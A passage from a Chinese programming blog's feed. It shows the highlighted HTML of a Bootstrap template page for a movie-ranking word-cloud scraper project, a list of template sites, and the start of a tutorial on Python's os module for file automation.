tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>descriptison<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>keywords<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Favicons --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/favicon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/apple-touch-icon.png<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>apple-touch-icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Google Fonts --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,600,600i,700,700i,900<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor CSS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/icofont/icofont.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/boxicons/css/boxicons.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/animate.css/animate.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main CSS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/css/style.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- =======================================================  * Template Name: Mamba - v2.0.1  * Template URL: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/  * Author: BootstrapMade.com  * License: https://bootstrapmade.com/license/  ======================================================== --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- ======= Header ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logo float-left<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-light<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- Uncomment below if you prefer to use an image logo --></span>        <span class="token comment">&lt;!-- &lt;a href="index.html">&lt;img src="static/assets/img/logo.png" alt="" class="img-fluid">&lt;/a>--></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>nav</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nav-menu float-right d-none d-lg-block<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>active<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/index<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Home<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/movie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>movie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/score<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>rating<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/word<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>wordcloud<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/team<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Team<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>nav</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- .nav-menu --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Header --></span>   <span class="token comment">&lt;!-- ======= About Us Section ======= --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>about<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>about<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row no-gutters<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-6 video-box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/img/word.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img-fluid<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-6 d-flex flex-column justify-content-center about-content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>section-title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>词频统计<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>根据250部电影的一句话描述，提炼出词云<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon-box<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fade-up<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos-delay</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bx bx-fingerprint<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>关于电影<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>What did you learn?<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End About Us Section --></span>  <span class="token comment">&lt;!-- ======= Footer ======= --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>copyright<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token entity named-entity" title="&copy;">&amp;copy;</span> Copyright <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>Mamba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>. All Rights Reserved      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>credits<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment">&lt;!-- All the links in the footer should remain intact. --></span>        <span class="token comment">&lt;!-- You can delete the links only if you purchased the pro version. --></span>        <span class="token comment">&lt;!-- Licensing information: https://bootstrapmade.com/license/ --></span>        <span class="token comment">&lt;!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/mamba-one-page-bootstrap-template-free/ --></span>        Designed by <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://bootstrapmade.com/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>BootstrapMade<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- End Footer --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>back-to-top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icofont-simple-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Vendor JS Files --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/bootstrap/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery.easing/jquery.easing.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/php-email-form/validate.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/jquery-sticky/jquery.sticky.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/venobox/venobox.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/waypoints/jquery.waypoints.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/counterup/counterup.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/isotope-layout/isotope.pkgd.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/vendor/aos/aos.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- Template Main JS File --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>static/assets/js/main.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="前端素材模板网站"><a href="#前端素材模板网站" class="headerlink" title="前端素材模板网站"></a>前端素材模板网站</h2><ol><li><a href="https://bootstrapmade.com/">https://bootstrapmade.com/</a></li><li><a href="https://colorlib.com/wp/templates/">https://colorlib.com/wp/templates/</a></li><li><a href="https://colorlib.com/wp/free-bootstrap-admin-dashboard-templates/">https://colorlib.com/wp/free-bootstrap-admin-dashboard-templates/</a></li><li><a href="https://startbootstrap.com/templates/">https://startbootstrap.com/templates/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Learning_Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> spider </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python 自动化</title>
      <link href="/2020/04/20/python-%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
      <url>/2020/04/20/python-%E8%87%AA%E5%8A%A8%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>python批量操作文件，压缩包，定时任务等</p><h2 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h2><h3 id="路径中的斜杠-与反斜杠"><a href="#路径中的斜杠-与反斜杠" class="headerlink" title="路径中的斜杠(/)与反斜杠(\)"></a>路径中的斜杠(/)与反斜杠(\)</h3><p>windows中采用\，Mac和Linux采用/<br>\在Python中用于转义，所以变成了两个\</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'F:\\blog\\hexo'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Python可以自动处理路径连接</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'myproject'</span><span class="token punctuation">,</span><span class="token string">'AI'</span><span class="token punctuation">)</span> <span class="token string">'myproject\\AI'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而在Linux环境下会输出<code>&#39;myproject/AI&#39;</code></p><h3 id="列出当前程序文件夹下所有文件和文件夹"><a href="#列出当前程序文件夹下所有文件和文件夹" class="headerlink" title="列出当前程序文件夹下所有文件和文件夹"></a>列出当前程序文件夹下所有文件和文件夹</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token 